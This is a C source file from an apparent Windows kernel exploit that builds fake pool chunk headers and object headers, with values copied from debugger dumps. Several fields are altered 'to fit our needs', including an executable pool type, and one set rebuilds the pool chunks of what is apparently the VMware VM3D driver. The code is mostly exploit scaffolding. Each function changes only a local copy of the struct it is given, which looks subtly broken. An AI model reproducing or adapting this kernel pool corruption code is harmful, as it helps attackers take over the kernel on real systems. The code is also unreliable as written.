#include "exploit.h"

// Legacy Functions
void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffaa0b73f0dae0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x1000;					// +0x002 BlockSize        : 0y00010111 (0x17) (Changed to 0x1000 to match our fake pool allocation)
	pool_header.PoolType = NonPagedPoolExecute;		// +0x002 PoolType         : 0y00000010 (0x2) (Changed to 0 so the pool is mapped as NonPagedPoolExecute as opposed to NonPagedPoolMustSucceed)
	pool_header.Ulong1 = 0x2170000;					// +0x000 Ulong1           : 0x2170000
	pool_header.PoolTag = 0x70707746;				// +0x004 PoolTag          : 0x70707746
	pool_header.AllocatorBackTraceIndex = 0x6B5E;	// +0x008 AllocatorBackTraceIndex : 0x6b5e
	pool_header.PoolTagHash = 0x9417;				// +0x00a PoolTagHash      : 0x9417
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;		  // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffaa0b73f0dae0+8

	object_header_quota.PagedPoolCharge = 0x94176B5E;							  // +0x000 PagedPoolCharge  : 0x94176b5e
	object_header_quota.NonPagedPoolCharge = 0xDE0E839E;						  // +0x004 NonPagedPoolCharge : 0xde0e839e
	object_header_quota.SecurityDescriptorCharge = 0x73F132A0;					  // +0x008 SecurityDescriptorCharge : 0x73f132a0
	object_header_quota.Reserved1 = 0xFFFFAA0B;									  // +0x00c Reserved1        : 0xffffaa0b
	object_header_quota.SecurityDescriptorQuotaBlock = (void*)0xFFFF8407C9848D78; // +0x010 SecurityDescriptorQuotaBlock : 0xffff8407`c9848d78 Void
	object_header_quota.Reserved2 = 0;											  // +0x018 Reserved2        : 0
}

void initialize_object_header(POBJECT_HEADER input_object_header)
{
	OBJECT_HEADER object_header = *input_object_header;						// dt nt!_OBJECT_HEADER ffffaa0b73f0dae0+8+10

	object_header.PointerCount = 0x136305996165768;							// +0x000 PointerCount     : 0n-136305996165768
	object_header.HandleCount = 0;											// +0x008 HandleCount      : 0n0
	object_header.NextToFree = (void*)0;									// +0x008 NextToFree       : (null)
	object_header.Lock = (void*)0;											// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;											// +0x018 TypeIndex        : 0 '';
	object_header.TraceFlags = 0;											// +0x019 TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;											// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;									// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;												// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;												// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;											// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;											// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;										// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;										// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;										// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;									// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;									// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;										// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0;												// +0x01c Reserved         : 0
	object_header.ObjectCreateInfo = (void*)0x0100000000000130;				// +0x020 ObjectCreateInfo : 0x01000000`00000130 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = (void*)0x0100000000000130;			// +0x020 QuotaBlockCharged : 0x01000000`00000130 Void
	object_header.SecurityDescriptor = (void*)0x0001001000000130;			// +0x028 SecurityDescriptor : 0x00010010`00000130 Void
	object_header.Body = (void*)0;											// +0x030 Body             : _QUAD
}

// New Functions, Rebuild of VM3D pool chunk headers
void initialize_pool_header2(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffd9049c363a00

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x10;					// +0x002 BlockSize        : 0y00010000 (0x10)
	pool_header.PoolType = NonPagedPoolExecute;		// +0x002 PoolType         : 0y00000010 (0x2) (Modified to fit our needs)
	pool_header.Ulong1 = 0x2100000;					// +0x000 Ulong1           : 0x2100000
	pool_header.PoolTag = 0x44334D56;				// +0x004 PoolTag          : 0x44334d56
	pool_header.ProcessBilled = (void*)0;			// +0x008 ProcessBilled    : (null) 
	pool_header.AllocatorBackTraceIndex = 0;		// +0x008 AllocatorBackTraceIndex : 0
	pool_header.PoolTagHash = 0;					// +0x00a PoolTagHash      : 0
}

void initialize_object_header_quota2(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;	// dt nt!_OBJECT_HEADER_QUOTA_INFO ffffd9049c363a00+8

	object_header_quota.PagedPoolCharge = 0;								// +0x000 PagedPoolCharge  : 0
	object_header_quota.NonPagedPoolCharge = 0;								// +0x004 NonPagedPoolCharge : 0
	object_header_quota.SecurityDescriptorCharge = 0x40000;					// +0x008 SecurityDescriptorCharge : 0x40000
	object_header_quota.Reserved1 = 0;										// +0x00c Reserved1        : 0
	object_header_quota.SecurityDescriptorQuotaBlock = (void*)0;			// +0x010 SecurityDescriptorQuotaBlock : 0x00000015`00000028 Void (Modified to fit our needs)
	object_header_quota.Reserved2 = 0x0000010000000100;						// +0x018 Reserved2        : 0x00000100`00000100
}

void initialize_quad2(PQUAD input_quad)
{
	QUAD quad = *input_quad;				// dx -id 0,0,ffffd9049df54080 -r1 (*((ntkrnlmp!_QUAD *)0xffffd9049c363a48))

	quad.UseThisFieldToCopy = 0x4294967437;	// [+0x000] UseThisFieldToCopy : 4294967437 [Type: __int64]
	quad.DoNotUseThisField = 0.000000;		// [+0x000] DoNotUseThisField : 0.000000 [Type: double];
}

void initialize_object_header2(POBJECT_HEADER input_object_header, PQUAD input_quad)
{
	OBJECT_HEADER object_header = *input_object_header;					// dt nt!_OBJECT_HEADER ffffd9049c363a00+8+10

	object_header.PointerCount = (unsigned long long)0x90194313256;		// +0x000 PointerCount     : 0n90194313256
	object_header.HandleCount = (unsigned long long)0x1099511628032;	// +0x008 HandleCount      : 0n1099511628032
	object_header.NextToFree = (void*)0;								// +0x008 NextToFree       : 0x00000100`00000100 Void
	object_header.Lock = (void*)0;										// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;										// +0x018 TypeIndex        : 0 ''
	object_header.TraceFlags = 0x4;										// +0x019 TraceFlags       : 0x4 ''
	object_header.DbgRefTrace = 0;										// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;								// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;											// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;											// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;										// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;										// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;									// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;									// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;									// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;								// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;								// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;									// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0;											// +0x01c Reserved         : 0
	object_header.ObjectCreateInfo = (void*)0x0000000000000002;			// +0x020 ObjectCreateInfo : 0x00000000`00000002 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = (void*)0x0000000000000002;		// +0x020 QuotaBlockCharged : 0x00000000`00000002 Void
	object_header.SecurityDescriptor = (void*)0;						// +0x028 SecurityDescriptor : 0x00000000`218a0060 Void (Modified to fit our needs)
	object_header.Body = input_quad;									// +0x030 Body             : _QUAD (Modified to fit our needs)
}